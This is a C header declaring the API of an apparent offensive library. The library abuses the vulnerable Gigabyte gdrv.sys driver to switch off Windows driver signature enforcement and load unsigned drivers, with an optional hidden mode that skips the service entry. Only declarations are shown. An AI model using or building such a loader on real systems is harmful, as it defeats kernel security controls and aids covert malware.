#pragma once

//
// gdrv_loader.h - Public API for the KDP-compatible driver loader static library.
//
// This library exploits the Gigabyte GIO vulnerable driver (gdrv.sys) to temporarily
// disable driver signature enforcement, allowing unsigned drivers to be loaded.
//
// Usage:
//   1. Optionally set a log callback via GdrvSetLogCallback()
//   2. Call GdrvLoadDriver() to load an unsigned driver
//   3. Call GdrvUnloadDriver() to unload a previously loaded driver
//   4. Call GdrvQuerySystemInfo() to retrieve system/CI/debugger information
//
// Requirements:
//   - Must run as administrator (SE_LOAD_DRIVER_PRIVILEGE is required)
//   - x64 only
//   - Windows 7+
//

#include <windows.h>
#include <ntstatus.h>

#ifdef __cplusplus
extern "C" {
#endif

// Log callback function type.
// Messages are wide-character formatted strings with status/debug information.
typedef void (*GDRV_LOG_CALLBACK)(const wchar_t* Message);

// Set a callback to receive log/status messages from the library.
// Pass NULL to disable logging (default). The callback is invoked synchronously.
void GdrvSetLogCallback(GDRV_LOG_CALLBACK Callback);

// Load an unsigned driver by exploiting the Gigabyte GIO vulnerable driver.
//
// Parameters:
//   LoaderDriverPath  - Path to the vulnerable driver file (e.g. "gdrv.sys")
//   TargetDriverPath  - Path to the unsigned driver to load
//   Hidden            - If TRUE, avoids creating a persistent service entry
//
// Returns: NTSTATUS code. STATUS_SUCCESS (0) on success.
NTSTATUS GdrvLoadDriver(
    const wchar_t* LoaderDriverPath,
    const wchar_t* TargetDriverPath,
    BOOLEAN Hidden
);

// Unload a previously loaded driver.
//
// Parameters:
//   TargetDriverPath  - Path to the driver to unload (same as was passed to GdrvLoadDriver)
//   Hidden            - Must match the Hidden value used when loading
//
// Returns: NTSTATUS code. STATUS_SUCCESS (0) on success.
NTSTATUS GdrvUnloadDriver(
    const wchar_t* TargetDriverPath,
    BOOLEAN Hidden
);

// System information structure returned by GdrvQuerySystemInfo().
typedef struct _GDRV_SYSTEM_INFO {
    // Boot environment
    GUID BootIdentifier;
    ULONG FirmwareType;         // 1 = BIOS, 2 = UEFI
    ULONGLONG BootFlags;
    BOOLEAN BootInfoValid;

    // Kernel module
    char KernelFileName[256];
    char KernelFullPath[256];
    BOOLEAN KernelInfoValid;

    // Code integrity
    ULONG CodeIntegrityOptions;
    BOOLEAN CodeIntegrityInfoValid;

    // Kernel debugger
    BOOLEAN KernelDebuggerEnabled;
    BOOLEAN KernelDebuggerNotPresent;
    BOOLEAN KernelDebuggerInfoValid;

    // Extended debugger info (Windows 8.1+)
    BOOLEAN DebuggerAllowed;
    BOOLEAN DebuggerEnabled;
    BOOLEAN DebuggerPresent;
    BOOLEAN KernelDebuggerInfoExValid;

    // SharedUserData
    UCHAR KdDebuggerEnabledByte;

    // Windows 10+ fields
    UCHAR KernelDebuggerFlags;
    BOOLEAN KernelDebuggerFlagsValid;

    ULONG CodeIntegrityPolicyOptions;
    ULONG CodeIntegrityPolicyHVCIOptions;
    BOOLEAN CodeIntegrityPolicyInfoValid;

    BOOLEAN SecureBootEnabled;   // Derived from KernelDebuggingAllowed query
    BOOLEAN SecureBootInfoValid;
} GDRV_SYSTEM_INFO;

// Query system information including boot environment, code integrity,
// and kernel debugger state.
//
// Parameters:
//   Info  - Pointer to a GDRV_SYSTEM_INFO structure to fill
//
// Returns: NTSTATUS code. Individual fields have their own validity flags.
NTSTATUS GdrvQuerySystemInfo(GDRV_SYSTEM_INFO* Info);

#ifdef __cplusplus
}
#endif
